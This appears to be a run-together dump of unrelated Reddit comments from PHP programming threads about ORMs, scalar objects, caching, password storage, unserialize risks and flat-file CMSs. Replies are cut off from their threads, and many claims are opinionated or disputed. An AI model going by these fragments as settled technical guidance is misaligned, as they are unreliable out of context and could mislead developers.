Okay. Suppose you have a "Category" which has many "Article". and "Article" has many comment. Show me how I can express number of comments in categories where "name" like "%Cake%" ? Here is how this would work in my proposed implementation: $category = new Category(); $category-&gt;addCondition('name', 'like', '%Cake%'); Now we have defined a sub-set of Category which we need. Next we can use one-to-many relationship on this data-set: $articles = $category-&gt;ref('Article'); I must point out that no queries has happened yet. If i would start iterating articles I'd get "select * from article where category_id in (select id from category where name like '%cake%')". $articles is essentially a sub-set of the Article DataSet. Let's continue: $comments = $articles-&gt;ref('Comment'); $count = $comments-&gt;count()-&gt;getOne(); OK. So we finally arrived at the count we wanted with a single query. How did it look like? select count(*) from comment where article_id in (select id from article where category_id in (select id from category where name like '%cake%')) and deleted = 0 Oh but where did that "delete=0" come from? Actually it's a condition defined in Comment model which another developer has added while I was on holidays. So if DataSet traversal is implemented as per my concept then you are no longer operate with "bunch of id's" but instead rely on expressions. And why not write SQL manually? because you wouldn't know about deleted records leading to a nasty logic error in your code. I hope I was able to explain how "traversing DataSet" is different from what most of ORMs implement right now. 
Oh and one more note. With "Expressions" we can easily use the code above to express 'comment_cnt' field for Category model: $category-&gt;addExpressions('comment_cnt')-&gt;set($comments-&gt;count()); Remembering that it still works with expression, now when we iterate through $category we have 'comment_cnt' there anytime.
Don't you think gearman is overkill? I use gearman for parallel processing, map reduce. Anyway I wouldn't use gearman for simple interprocess communication
There are a lot of different ways you can communicate between processes. The question is really how complicated you want to get? You can do as complicated as shared mem or as simple as writing into a file. You can use semaphores and process messages or even shared memory. What exactly are you trying to accomplish? Like I said, it's all about how complicated you want to get?
Nice, I'm not sure how I didn't see that were running concurrently.
Thank you and the team for the amazing ORM of Cake. I use it every day at work and it could handle each and every DB query problem we've thrown at it. Lots of complex chained matching-queries with custom finder methods, deep associations, and it still works flawlessly with a very nice API on top. It's a pleasure to work with it.
Thanks, Jose. I'll study Cake's ORM in more detail, however it looks more of a "query builder" and not the model manager.
I wrote [Remit](https://github.com/asyncphp/remit) exactly for this reason.
Check out [Grav](https://getgrav.org/); it is very flexible and has a lot of development support behind it. 
&gt; it does not care how exactly User DataSet is defined, it could be a UNION or few joined tables. But then how do you add a user since you can't insert against a UNION query or a few joined tables. 
This kind of looks like every good ORM I've ever used but with a worse API. No offense intended but most ORMs let you filter expressions down, have pre-filtered collections, etc and only execute a single SQL query when you go to traverse.
Just in case you don't want to maintain your own whois server list and don't want to bother with ip bans: [Whois API](http://whois-api.domaininformation.de/)
This looks promising, I'll have a "more in details" look a bit later
What features does it have that you don't need?
That's horrific; I'm not sure supporting that has a major first-class feature makes a lot of sense. 
You're setting $pos to the result of (strpos() !== false), which will continue to be true at each iteration. Instead, you should first set $pos and then handle it's state: if($pos = strpos($string, $find, $offset) or $pos !== false) Note that I'm using "or" because the first condition might evaluate to false when $pos gets set to 0.
Ah ok, no worries I think that would be the most common answer (the stability) but if you ever do get better and feel like you can take on other jobs you should think about branching out, a good developer is worth the same amount regardless of where they live if you're just freelancing.
"5. Please use SQL? [...]" Yes! What you just said. ORM / AR is great for *some* things, but sometimes you have to get the stuff done with native SQL. If you read the specs of the SQL standards you will be amazed what things you can do with it. Want to do weird joins in your ORM that is easy in SQL, but hard in your ORM of choice? You could make a view in your DB and query that. It's amazing what you can do in SQL. Don't try to reinvent the wheel, but read the docs (very thoroughly). Or ask an expert. If you like learning, you should google "relational algebra". https://en.m.wikipedia.org/wiki/Relational_algebra
Your comment is akin to saying 'assembly is a perfectly good language lets just use that'. Abstractions are sometimes a good thing. 
https://www.pulsecms.com/ is very small &amp; dead easy install
^ This is the kind of thinking that gave us SQL injection.
If you are going to promote your business in a blog post make it a bit more subtle at least.
I'm not a professional, but that's sort of hard to read. If you keep your while loops simple, its a lot easier to read. But, that's just my opinion: &lt;?php $string = 'this fries eat chiscken'; $find = 'is'; $offset = 0; $pos = strpos($string, $find, $offset); while ($pos !== false) { echo "$pos &lt;br&gt;"; $offset = $pos + strlen($find); $pos = strpos($string, $find, $offset); } ?&gt;
He's heading over to /r/ReinventTheWheelAsMuchAsIPossiblyCan 
If it's optional and incomplete than it's completely pointless. It breaks encapsulation because you are literally declaring the implementation details in the interface. Change the implementation and you have to change the declaration -- which defeats the whole purpose. 
&gt; They are hardly outliers. That is literally the set of largest tech companies in the world. Outliers. &gt; Billions of records and SLAs are pretty common and the correct way to change a schema is often a join. Unless you have billions of records and SLAs then you don't do this because it's a poor way to handle change in general. 
&gt; If it's optional and incomplete than it's completely pointless. I honestly see quite a bit of optional and incomplete in php. Which isn't bad, insomuch as it's experimental and I'm ok with spending some time to see what practices seem beneficial. &gt; Change the implementation and you have to change the declaration -- which defeats the whole purpose. Not mine *shrug* I still have to change my comments. Anything to remove reliance on comments as code, is a Good Thing(tm). You don't have to catch the exceptions, just being aware of them is a baby step that I would welcome.
Unless you are aware of the exceptions of every dependency of your code now and in the future, even your comments are likely wrong. Error handling should be done based on what you can handle (where you can handle it) and not method calls. If you can handle a network failure by retrying your current operation, that has nothing to do with some exception that might be called 15 levels down the call stack.
fml, the day someone will curse the ORM for n+1 problems and "scalability" while calling active record a good concept instead has finally come.. farewell my far brothers, the mayas were right after all.
How about some of these solutions? http://pastebin.com/NyYs1r5L
How stupid are your fanboys that they upvote you even when you make claims you can't verify? And why exactly do your users not want us plebs to know that they're using laravel? Are they ashamed of it or worried that Laravel security flaws would be used to target their websites?
Thanks for the kind words! I'm glad it is working out for you so well
Ok. The latest one I heard about was Vice Videos. Runs on Laravel and Vue. The Winter Olympics APIs ran on Laravel and did huge traffic, built by Infostrada in EU. Contact them if you want verification. There's just a couple. 
I was wondering how others deal with this problem. I, like you, use a dependency container. But it's basically an abstract class holding an array of 'dependencies'. For each project where I need it, I create a class that extends the abstract class and then I add a getter method for each type of dependency. (I usually only have one per type anyway). This way, I can simply do `$user = $dc-&gt;getUserManager()-&gt;getUser('1');`. See example [here](https://github.com/c00/samples/tree/master/samples/dependencies).
Service Locator and Dependency Injection is a different things. 
seem legit :) then I have no more ideas 
It is the most practical and simple solution to SQL injection. Relating the two is just the result of experience. I use Eloquent for many reasons, like switching from mySQL to Pgsql with just a configuration line, to build different parts of the query in different parts of the code, for things like pagination or search filters, etc. Even if I write SQL by hand to test many things (and yes, I also check the SQL generated by the ORM, just to be sure), I don't see a reason to lose the ORM advantages just for ideological purity. Writing pure SQL inside a PHP script is IMO, incompetent use of both languages.
I'm sorry, why the fuck is this getting upvoted?
IMO you shouldn't rely on caching to handle normal traffic. If the pages have content that comes from a database, and the page never changes, why not make that a static page? No reason to cache that. You should optimize your code and your queries. Depending on caching will end up being a crutch you need forever.
Thank you for the reply. Sorry for being late. I agree with propel being alpha makes it alpha, but the question is in the composer.json , doesn't that need to be alpha than dev ?
Personally I find having the more complex expression as the loop condition to be worthwhile if it reduces code duplication of the `strpos` call.
There has got to be a better way than +1 or adding a comment ... I mean, seriously? 
Well I'd still recommend you submit this to climb. Their interface is much nicer.
constructive criticism on the subject is in the 1mil+ google results, and the top 2 replies sums it up for you. you cant talk situations because you dont know when your app is going to scale, even when youre 100% sure it doesnt, youre better off without it. take a look around in the laravel projects laying around, and see the effect breaking SRP has, it leads to every bad design decision you can think of, and why? because they can, and are not forced to think of a better way to handle a specific situation. this is why you have design patterns, and why it sucks. you cant talk situations
Yes, this was introduced last month https://github.com/blog/2119-add-reactions-to-pull-requests-issues-and-comments
ORM has no relationship to SQL injection -- at all. It's quite straightforward to write an an ORM framework that permits SQL injection. Incidentally if you work on an application of any real scale and transnational complexity with a relational cluster you simply cannot let an ORM generate SQL for you, you're data will be to complex and the queries it generates will not be suited to your transactional guarantees. ORMs are mostly for middle-sized web applications of real trivial complexity that have been over-engineered to give the veneer of having something complex to do. The idea of handing off the 20-line SQL queries of complex real time systems to "eloquent" is absurd and show a development immaturity. 
SO BRAVE. SUCH COURAGE. MUCH WOW.
No, because I need new stuff from dev :)
Models should be designed as a set of data and methods that manage and validate that data representing a business domain object. Any functionality relating to storage, retrieval, and management of relationships between entities is outside the scope of a model's single responsibility (and thus violates SRP). The point on relationship management is related to the improper coupling of storage responsibility to the models. In an AR-like design, bi-directional relationships need to managed by both entities, and there isn't any particular guarantee that they both handle it the same way (and if they do they can tend to duplicate code across the entities to manage business logic or conditions of the relationship). 
Even after I made a comment about using reactions over cluttering the comments with +1....someone goes and posts a comment with +1 
I agree with the first paragraph you wrote, the actual implementation of this feature can be very tricky, and needs to be carefully planned and executed. It will still take a long time until scalar objects can be integrated into PHP core, Nikic is probably looking for ways to improve it further. Of course, its nice so many people want this feature, more supports wont hurt, just no pestering. I strongly disagree with the second paragraph though, this clearly is a good idea. If you get a bug because string methods are not available for numbers, it is the weak typing(implicit type conversion) that makes PHP error prone. You cant blame this on scalar objects, and in fact explicit type conversion is encouraged and should be enforced in serious PHP projects, which effectively removes the concern. PHP being weakly typed is a serous design flaw for this language, it is the source of problems as you mentioned. Having scalar objects actually can force users to apply good programming practices. Since you need to be aware of the type of variable you are using, it will eliminate glitches due to PHP's implicit type conversion messing things up. 
Fixing the API is a big deal. It's pretty much the last big stain on PHP's design. 
Because `"SomeString-&gt;length()` or `[1, 2, 3]-&gt;map(function ($key, $value) { });` would be cool. And, in my opinion, a lot more intuitive. It would make more sense and be more readable as far as I'm concerned. But I'm curious as to what arguments against it you have
&gt; I think there are far more significant issues all over PHP's design. Really? Because none of these have near the impact of the inconsistency and inscrutability of the standard library. &gt; Separate symbol tables for functions, constants and classes makes symbol names context-sensitive and ambiguous. And how often is this an issue? &gt; Class::$var is not dynamically looking up a constant but instead a property lookup. No other context uses $ in this way. $ clearly indicated variable access as constants do not have it as a prefix. This one is perfectly logical. Class::BLAH would be looking up a constant. &gt; Bare strings. Bare strings trigger an E_NOTICE so I consider this one solved. &gt; Unsetting properties that are defined by a class definition... ugh Again? So what. If you consider that bad, don't do it. But you cannot avoid the standard library. 
Scalar objects is something everybody would benefit of - both beginners and experienced developers, because it is simply impossible to remember all the idiosyncratic functions for arrays and strings. With scalar objects these operations would be easier to remember (because they can be named for what they do, instead of something like "ksort" or "strstr"), IDEs could offer the available object methods if they know the type of a variable, and code would become much more readable. These are not minor "cosmetic" points. These would actually lead to less development time &amp; more productivity - even for experienced PHP developers.
&gt; &gt; Separate symbol tables for functions, constants and classes makes symbol names context-sensitive and ambiguous. &gt; And how often is this an issue? All the bloody time. Want to know why we don't have function or constant autoloading? It's partly because of this reason. &gt; $ clearly indicated variable access as constants do not have it as a prefix. This one is perfectly logical. Consider `$obj-&gt;$var`. Is that looking up the property `var` on `obj`? No. It looks up the result of `$var` on `obj`. Is `$obj-&gt;$method()` calling `method` on `obj`? No. It looks up the result of `$method` on `obj. &gt; Bare strings trigger an E_NOTICE so I consider this one solved. This still prevents first-class symbols from being a thing. &gt; Again? So what. If you consider that bad, don't do it. But you cannot avoid the standard library. So let's *duplicate* the entire standard library? How does that make the situation better?
You say *significant*. But significant to whom? The majority of the issues you mentioned are things that PHP core developers like to philosophize about, but frankly, I don't think they have much impact on people actually writing PHP code. Incompatible `$this` calls are something *I* care about, because I work on optimization and thus it is my enemy. But someone working in PHP probably hasn't seen this used in the last five years, if they even know what it is at all. On the other hand: I would consider myself a reasonably experienced PHP programmer. And yet, if I'm writing code in vim and want to use the `strpos` function, I will do a quick check of php.net/strpos every. single. time. I think you have a fairly skewed perception of what issues are *significant*. Your perception centers around theoretic purity and questions of high-level language design. These problems *are* important, certainly, but this does not imply that more practical issues are not of consequence either.
Can anyone with CQRS experience comment on the implementation/design? Is this something worth learning from?
&gt; All the bloody time. Want to know why we don't have function or constant autoloading? It's partly because of this reason. I don't see why that would prevent function or constant overloading. The problem is that autoloading pre-dated the existence of namespaces. So we have class autoloading not namespace autoloading. &gt; Consider $obj-&gt;$var. Is that looking up the property var on obj? No. It looks up the result of $var on obj. Is $obj-&gt;$method() calling method on obj? No. It looks up the result of $method on `obj. True but since :: is the scoping operator, it's simply changing the scope of accessing a constant, function, or variable. Therefore it makes it perfect sense that blah::$var is a variable access and blah::function() is a call, etc. PHP could have been more consistent if they had used :: for namespace access as well but there were technical issues with that. &gt; This still prevents first-class symbols from being a thing. You're still talking about features that really aren't that important. Lots of languages do not have first-class symbols. The standard library is million times more significant than this. &gt; So let's duplicate the entire standard library? How does that make the situation better? Because if you don't duplicate it, you don't have backwards compatibility. And it's not duplication; adding methods to scalars is quite a bit different from a big flat namespace of functions. This is like arguing that C++ didn't need the STL because the C standard library exists; it's true but it doesn't make it good. 
Implementing this will be a lot of work and will need a lot of thought (that's the obvious drawback), but it is a chance of a "new beginning" - PHP code could become so much more readable (even if you just look over code from somebody else) and easier to write. Not to mention that IDEs could help by offering the available methods of a scalar variable, because the type is usually known (through PHPDoc and/or type hints), so looking up array or string functions in the PHP manual would not be necessary anymore. Scalar objects are the perfect extension to the new int/string/float type hints - when using both together, you have a more reliable code base and you don't run into the situation of calling a string function on an array. The IDE would also catch that easily. Strict types are not even necessary for this to be really useful, and in most projects you want to convert variables to their correct type anyway to avoid problems, which would have a new prominent bonus if easy-to-use methods can be called on these variables. This would also convert PHP into a language which many people could start to love, instead of being annoyed because function names have to be looked up and you run into the same idiosyncratic behavior again and again. I like PHP, but improvements such as well implemented scalar objects would convert me to a PHP lover ;-)
I just looked up strpos again today to be sure about the ordering and arguments. It never gets old, unfortunately.
I actually quite like the sound of having this in the core. It's an effort I'd be up for investing some time into.
😛
/u/ircmaxell wrote a bit about similar proposals [here.](http://blog.ircmaxell.com/2014/03/an-opinion-on-future-of-php.html) I'm inclined to agree with him on this: it sounds like a good idea at first glance, but there are some pretty jarring implications. Let's say you have a variable $foo containing a number. To round it to the nearest integer, you do round($foo). To get its string length, you do strlen($foo). Now let's say we have methods on scalars. Maybe integers and floats have a -&gt;round() method, and strings have a -&gt;length() method. But is $foo an integer/float, or a string? Before, we didn't really care, but now we do. If $foo comes from $_GET or a database query, then it's probably a string. If we want to round it, we first have to explicitly cast it to a float. If we then want to get the resulting string length, we have to explicitly cast it again to a string so it'll have -&gt;length() available. Hooray, we've just managed to make our standard library more complicated to use. :( We could avoid this issue by adding ALL of the standard scalar methods to ALL of the types, and methods that don't make sense on a given type could trigger an automatic cast. Well, you'd still have to do an explicit string cast if you want to treat an object as a string (via __toString()), but we could probably live with that. But in this case, how many methods are we talking about here? All standard library string functions, array functions, math functions, etc? We're just lumping them all in effectively the same namespace on all scalars? Any chance that we'll look back on that decision a few years from now and think, "Who thought this mess was a good idea?"
I'll look into it. Thanks man. Good job on designing your own.
&gt; It's quite straightforward to write an an ORM framework that permits SQL injection. And also a waste of time. About your other point: If a query is too complex, then you write a stored procedure and call it.
 Why make a function but maintain the asspain of needing to compute the seconds? why not something more like get_hours_range( '08:00', '18:00', 30, 'H:i' )
Which of these is easier to follow? $camelString = lcfirst(str_replace(' ', '', ucwords(str_replace('_', ' ', $snakeString)))); $camelString = $snakeString-&gt;replace('_', ' ') -&gt;ucwords() -&gt;replace(' ', '') -&gt;lcfirst();
Oh. Then I am sorry. Delete please. Oops.
I'm pretty sure we won't be lacking support for complex queries. My previous project is DSQL - Query Builder and one of the goals is support for complex query syntaxes. Here is a wiki page showing how to build even most complex queries: https://github.com/atk4/dsql/wiki/Awesome-Queries. If user does not have to fall back to "raw" queries, he can remain safe from injections. [DSQL](https://github.com/atk4/dsql) will be used extensively in my implementation of described concept.
What about CASE WHEN ... END in queries? Yeah, I have done some crazy queries... Also, take into account my other comment, about adding hierarchical data (trees) support. Now that's a killer feature.
I'd like to express my gratitude to Reddit community for the feedback by experts from so many different backgrounds. Your comments and suggestions has been very helpful and very inspiring. I have decided to continue with this project. Those who wanted to join and help me with more advice and critique are very welcome to follow my Github repository or get in touch with me on Gitter. https://github.com/atk4/dataset It will probably take me week (or few weeks) to design the concept and API draft. Once it's all polished and cleaned up, I'll post it up on Reddit again before coding. I wanted to plan and develop this project by tightly working with PHP community and make sure that the resulting code wouldn't be thrown into "yet another Not-so-ORM library", but would be worthwhile and solve the existing pain. As promised, my code will be available under MIT License.
I guess we can agree to disagree. Sites I've worked on never needed caching during normal traffic. Only when the traffic was 1,000 times more than normal, did I worry about caching. What would happen if you are relying on caching from the beginning, then you get 1,000 times the visitors, can't turn on more caching? A properly configured server or servers should be able to handle your code and scale as needed. I'm also not a fan of frameworks lol
&gt; Varnish works better if you can cache things Why else would you use Varnish? Also, why not use [nginx fastcgi_cache](http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_cache)?
Got it, can this approach work for AR models by simply delegating save call to external layer? I already build few applications using that way at top of AR ORMs and can't find any downsides so far, but i think it can be few i can't see yet :/ public function save(AR $model) { //Native AR save $model-&gt;save(); //Syncing databases, queues and etc } public function saveFor... P.S. I know, it's easier to switch to data-mapper i.e. Doctrine to do that, but i'm just curious about AR related workaround.
Yes, that's exactly how I'm planning to do it. I believe that user can be educated to "think" of persistence layer through [concise and descriptive syntax](https://github.com/atk4/dataset/wiki/API-Design#default-persistence-layer), but it [must remain lightweight and easy to read/write](https://github.com/atk4/dataset/wiki#our-design-goals-are). I'm actually thinking that "persistence" layer could act as a runtime object "trait" for the model: $user = $sqldb-&gt;add('Model_User')-&gt;addCondition('name','like','John')-&gt;loadAny(); $user['up_vote']++; $user-&gt;save(); $user = $memcache-&gt;add('Model_User')-&gt;addCondition('name','like','John')-&gt;loadAny(); // Error. addCondition is not supported by memcache. So now if we are writing Unit scripts, then we can use mock DB without modifying anything in the Model itself: $mockdb-&gt;expect('load', function(){ return ['name'=&gt;'John']; }); $user = $mockdb-&gt;add('Model_User')-&gt;loadAny(); $user['up_votes']++; $mockdb-&gt;expect('save', function($payload) { .. } ); $user -&gt; save(); 
Oh look another command bus. I'll add this to the pile of 12,302 other PHP command buses I'll never use.
Don't think it even has a valid use case. Especially this weirdo brand of PHP buses that are never even piping commands to anything other than a handler within the same PHP project.
&gt; What would happen if you are relying on caching from the beginning, then you get 1,000 times the visitors, can't turn on more caching? Caching is _clearly_ not the only optimisation you can make, but it's low hanging fruit. It is usually very simple to implement vs hand optimising queries and code paths prematurely. also 1000x more? what's normal in your eyes? &gt; A properly configured server or servers should be able to handle your code and scale as needed. You elude to multiple servers here, and it's something I agree with - scaling horizontally is usually a good strategy. But with a good caching strategy you can make an app run comfortably on less hardware. If you hit limits you can obviously still add more servers, but caching increasing the amount of time between each addition of servers - and is generally far less costly than doubling your server bill every time your usage increases. &gt; I'm also not a fan of frameworks lol ... um.. good for you I guess? what on earth has this got to do with anything? 
Autocorrect is no excuse for not being able to proofread your own writing.
Unfortunately people don't read, not even when it's literally pixels above where they're typing.
&gt; You can build a custom password encryption algorithm We strongly advise that nobody ever do this, unless you happen to be a cryptography expert.
I misused "scalars" there. If method syntax were to be added to scalars, I assume people would want it on arrays as well.
&gt; Unsetting properties that are defined by a class definition... ugh Could you provide an example of when this is ever a good idea?
The __call shortcut is a great idea! I agree it would be more readable for regular functions. Processing the payload as the functions are added also makes way more sense, since I don't need to store the stages in memory. Originally I was planning on building a reusable pipeline, so the payload wouldn't be available at the time you were adding the stages, and the code stuck around after the rationale was gone. Edit: Pushed a new tag with these changes, thanks!
What is "hand optimising queries"? Do you not write your own queries? Normal is about 400,000-500,000 page views each month. Each page view could include 80-100 requests (Images, JS, and CSS). So, around 32,000,000 requests each month is pretty normal traffic. From my example, it is one server running PHP and nginx, it connects to another server running MySQL. &gt; ... um.. good for you I guess? what on earth has this got to do with anything? Maybe the title of this post "Do you think Laravel will resist with million visitors daily?" I will admit caching is nice, but I would not depend on it. Like my first comment said: &gt; You should not depend on caching. I feel like if you depend on caching for your site to perform, you're going to be lazy and not be concerned with the quality of what you write. Optimizing your database structure is a valuable part when creating any site.
&gt; 32,000,000 requests each month is pretty normal traffic. so, lets for argument's sake assume that there are 30 days per month, you're looking at about 12 requests per second, and you think you shouldn't start caching until you hit 1000 times that, so your system should, without caching, be able to support 12,000 requests per second? I call, in no uncertain terms and with all due respect, bullshit. &gt; Optimizing your database structure is a valuable part when creating any site. No disagreement. But over optimising or prematurely optimising is not valuable. &gt; I feel like if you depend on caching for your site to perform, you're going to be lazy and not be concerned with the quality of what you write. I feel that this is bullshit. One can write a system which caches up front, first, and relies heavily on caching to avoid the need to unnecessary purchase additional server time without being lazy. Your entire premise is that if you cache you will be lazy. Utter hogwash. You are creating a false dichotomy between the use of caching techniques and quality. 
I would say, if you use ESI then Varnish will have native support for this. I have seen some 'hacks' for fastcgi_cache but I will be wary of using them on production. If you are caching full pages, there is no reason to use Varnish. Note that fastcgi_cache can be a bit slow as it uses disk instead of memory like Varnish but maybe there are some workarounds on this.
&gt; You can build a custom password encryption algorithm **No.** There are a few things wrong with this: The first is that you _do not encrypt passwords_. You **hash** passwords. Encryption is reversible, a hash isn't. If you get hacked, and somebody dumps your database and encryption keys, you may as well have stored every password in that database in cleartext. Secondly, unless you are a cryptography expert, _do not_ roll your own crypto. Hell, as someone who considers himself somewhat competent at security, I absolutely refuse to touch any kind of crypto code because **I will fuck it up.** Of course, you're selling a product claiming to be secure to customers, so I'd expect you know better, right?
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/lolphp] [this thread (people tripping over themselves to give the most convoluted answers possible, when the solution is two parenthesis)](https://np.reddit.com/r/lolphp/comments/4f9unz/this_thread_people_tripping_over_themselves_to/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
This is a good write-up. If you're interested, here's a significantly more challenging obfuscation: http://pastebin.com/qewPKBLC (By [Brian Wallace](https://twitter.com/botnet_hunter).)
He's not only telling he's leaving the subreddit. He addresses a general problem of it, too.
I was recently looking for one and I ended up just using a python implementation where libraries are a bit more prevalent. 
To my knowledge, you might be able to use Levenshtein as the distance metric with LSH but it'd be a component of the broader LSH algorithm. 
Looks like some form of encryption rather than obfuscation, using `$_REQUEST['pass']` as the key.
OMG The date. It makes sense.
Am I the only one feeling that array_map() should better suport not only arrays? Let me explain with simple example. How we do it now: array_map(function ($string) { return substr($string, 2, 3); }, $array_of_strings); Would be much nicer: array_map('substr', $array_of_strings, 2, 3); It is trivial when numbers are used, but when those arguments are variables, then we start adding `use ()` and readability goes even worse. Thoughts?
Hi, Typically, requests for hiring people are constrained to /r/forhire (don't be surprised if the moderators close this and ask you to post there instead). &gt; I am looking for a security auditor for a PHP application in the Houston area Is the physical location of the auditor a deal-breaker? I've done [several code audits remotely](https://paragonie.com/security). If you're fine with remote work, feel free to [send us an email](https://paragonie.com/contact) to set up a call.
Well fuck. I've got a ton of scripts like this saved away. Maybe I should actually blog about them or something. 
I will go ahead and do that It is not a deal breaker, but it helps in communication, I shall PM you
i am not really sure what you want to learn, the actual HTT-Protocol? there is no real PHP context to it ... i mean, i personally dont really know much about it on protocol level and never cared, i certainly dont need to understand it completly to deal with post/get/cookies or even HTTP headers ... maybe you go more use-case-based and research those usecases, if Stackoverflow doesnt have an answer to something, it usually means you are asking the wrong question.
This is something that can be achieved by just referencing a single method in both exception cases. Whats the point?
HTTP is protocol for exchanging messages (mostly used for websites). HTTP messages consist of header and body. HTTP request has a method. Most popular ones are GET and POST. So start with those. When you submit html form, all values get posted using POST. Inside PHP you can access data posted with these methods through $_GET and $_POST variables. Later you can try building fully RESTful applications, read on that
Question... for example, Doctrine 2 has some types for arrays, like simple array (serialize/unserialize PHP array) and also json (encode/decode). Now, if you have something like class MyEntity { // simple_array, will be serialized by Doctrine as a PHP array $data = []; } If the user can store text data in there, for example $data[] = 'Text from user'; My guess is... they could craft a text string so it unserializes the $data as an object of class X ? If this is vulnerable, so what will be a good way to serialize an array? Do we have to clean up every $data element to not contain a serialized object? use json so it is 'safer' ? 
I prefer the principle "Anorm" : https://github.com/playframework/anorm/blob/master/docs/manual/working/scalaGuide/main/sql/ScalaAnorm.md Ting is a bit on the same principle, you work with real SQL. http://tech.ccmbg.com/ting/
&gt; But in another it still adds cognitive load. $style_1 = lcfirst(str_replace(' ', '', ucwords(str_replace('_', ' ', $snakeString)))); $style_2 = $snakeString-&gt;replace('_', ' ') -&gt;ucwords() -&gt;replace(' ', '') -&gt;lcfirst(); Are you saying that $style_2 *adds cognitive load.*
Very nice lib. Good job The one thing I find cumbersome is a little bit too much "wiring boilerplate" to setup a simple Command[Event|Query] bus. While I appreciate implicit setup vs hidden magic, maybe some common defaults could improve instantiation, like using `Handler` strategy by default and `InteropContainerResolver`, so your can avoid althogerther the middleware def. You could then bootsrap with: $container['CommandBus'] = function() use ($container) { return new \NilPortugues\MessageBus\CommandBus\CommandBus(); }; With default behaviour, without losing alternative configuration options for custom use cases.
&gt; constant autoloading Are you kidding?? Do us all a favour, Jus dont work on PHP_internals anymore.. PS: Next up is variable autoloading.
Damn... I've got like ~2GB full of spam sending scripts, all using different obfuscation methods (from simple base64_decode, all the way down to outright encryption), but I never bothered to check them out... Would be "fun" to blog about all and any spammy methods I find daily :)
I blogged about something similar a few years ago, my writeup wasn't anywhere near as good though (also the script I pulled apart was simpler). http://dan.cx/2011/11/pulling-apart-wordpress-hack
You sure did :D But lazy doesn't have to mean wrong. I like lazy + stating assumptions.
you should give pico a try. Pico - A stupidly simple, blazing fast, flat file CMS. http://picocms.org/
Good approach!
[removed]
Thank you - I am terrible at expressing myself.
I think, it should be a factory like https://github.com/zelenin/telegram-bot-api/blob/master/ApiFactory.php#L16 Don't use defaults in clear SOLID class.
What talks, articles or books would you recommend for caching? The only good one I ran into was [a talk by Eli White from a UK Conference in '14](https://www.youtube.com/watch?v=bsZQcbBcXuQ). Basically ran into an issue where we're serving on average 400k users daily and our home page is basically a link aggregator which displays around 30 groups &amp; 1400 unique items spread between said groups with a lot of individual checks on each item which ultimately gets cached which ends up being a lot of html generated overall, but the data is updated regularly so we're constantly clearing that data and recaching it and the site can be extremely slow at times. I've even approached the problem with full page caching and even that at times can take up to 700-1000ms average to load the page which is unacceptable to our users. After years of PHP, no one really prepares you on how to properly approach caching. So yeah, pointing me to some good resources would be great.
The extra parameters on array_map let you pass multiple values to the callable at once. If you really wanted, you could use array_fill to make arrays with just the values for strlen. &lt;?php \$a =["ducks","ticks","packs"]; print_r( Array_map( 'substr', \$a, array_fill(0, sizeof(\$a), 2), array_fill(0, sizeof(\$a), 3) ) ); ?&gt; That seems too "clever" though and won't really help readability. Typically what I do to improve readability with array_map is to assign the callable to a variable.
Umm.. no. You see, each deobfuscation is manual work since it's rarely possible to automate such tasks. You see, the writeup here greatly explains individual approach to speciic script. The only possible automated thing here would be code formatting :)
A change like this would not be backwards compatible because array_map can already take multiple arrays as arguments.
Any script that analyzed another script would, in turn, become exploitable.
Generally, this is vulnerable: unserialize($userData); While this isn't known to be: unserialize(serialize($userData));
Very cool! Now we just need `zend-view` to not leak memory like crazy and it could be usable :P 
I've never even heard of this until now. Great to see some competition for hhvm, especially so since the .net runtime now works on Linux 
It sounds like you're talking about returning a new object of the same type. I'm talking about returning the very same object, not just of that type. Even if `static` allowed for the same object to be returned, the problem is that it's not specifying object chaining. At least making it plain what is expected of the implementing method.
Its interesting... I took a stab at loading Slim into React, it worked okay. Was a fun little excercise. https://github.com/geggleto/reactive-slim
It's a fairly new project :)
You must have missed the part where the function explicitly declares it implements the interface.
I think he said that this RFC is good because it requires things to be explicit.
Well I wonder, is it possible to at least, move this to PECL first? This way its easier to install and use the package, and even if it will never make to PHP core, we still have some ways to use it in production environment. 
This is interesting. I'm a little concerned about the existence of a type of object that is only that type under very specific circumstances with no sort of indicator in the code.
how have you not heard about it? it's posted on this sub every fucking day
After creating a car, where should it drive?
Ooooh, I see, my bad. Just in my defence, people have said that it's weird that you can call the method by name, without realizing that's kinda the point, I thought that was being called implicit, somehow ... My mistake ...
Yeah because this looks wonderful: function json_encode(null | array | string | int | float | bool | JsonSerializable $data, int $options = 0, int $depth = 512) : string { // ... } function json_decode(string $json, bool $assoc = false, int $depth = 512, int $options = 0) : null | array | string | int | float | bool | stdClass { // ... }
HAHAHAAAA
mobiles running dotNET and/or Xamarin (iOS, Android, Windows)
I never said that I like JSON :-P
xamarin is an SDK, it doesn't run on phones? If you want to run .net on android, do you bundle the whole runtime in your app?
well, it's just a matter of taste I guess, probably 80% of use cases will be individuals downloading for his own project and wiring as your README says, so... But it's fine, and as /u/zelenin says, probably a factory is *the right thing* and out of your project scope
your are right
Right, my opinion of these guys is changing fast. I found some other red flags, the biggest of which is our old friend unsalted md5 passwords.
Without sounding like a dick, what's the point of this post?
There was some discussion on this at Laracasts. I hope I'm not misstating, but I think the user profile area was heavily vue dependent.
Little to no point.
I mean why do he wants to see union types in PHP. I really don't like this idea and think that this would open gates to hell.
What profit this gives for php type system? I don't see any.
It is though, and it gets upvoted every fucking time, all this guy does is spam marketing posts and he's straight in.
Thanks for the article, I wasn't aware of the hash table collision vulnerability with json_decode. 
Nobody's forcing you to read it ;)
Theres also VersionEye
Because its called a "flat file cms" the goal behind most of these is the concept of "no database" They seem to be pretty popular and I want to understand where the data is stored and how people store the data.
Somebody has been looking at Rust...Lol.
Use a Json file in a protected folder, very quick and easy to work with for relatively small chunks of data. Don't store plain passwords.
The clue is in your question! I'd recommend SQLite.
If you don't want to manipulate files or use a database, how do you expect to save *any* data?
+1
https://www.w3.org/ https://www.w3.org/Protocols/#Specs
Check out the site/users section of https://docs.statamic.com/guides/getting-started#folder-tour you will see these are just file-based as well.
